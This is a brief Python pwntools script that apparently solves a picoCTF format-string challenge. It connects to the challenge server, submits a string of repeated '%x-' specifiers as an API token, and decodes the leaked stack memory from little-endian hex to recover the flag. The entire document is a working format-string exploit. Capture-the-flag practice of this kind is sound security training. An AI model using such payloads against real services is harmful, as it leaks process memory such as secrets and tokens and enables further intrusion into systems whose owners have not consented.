from pwn import *

r = remote('mercury.picoctf.net', 6989)
r.recvuntil('View my portfolio')
r.sendline('1')
r.recvuntil('What is your API token?')
payload = '%x-' * 50
r.sendline(payload)
r.recvuntil('Buying stonks with token:\n')
leak = r.recvline().decode('utf-8').split('-')

flag = ""
for l in leak:
    try:
        tmp = bytearray.fromhex(l).decode()[::-1]
        flag += tmp
    except:
        continue

print(flag)
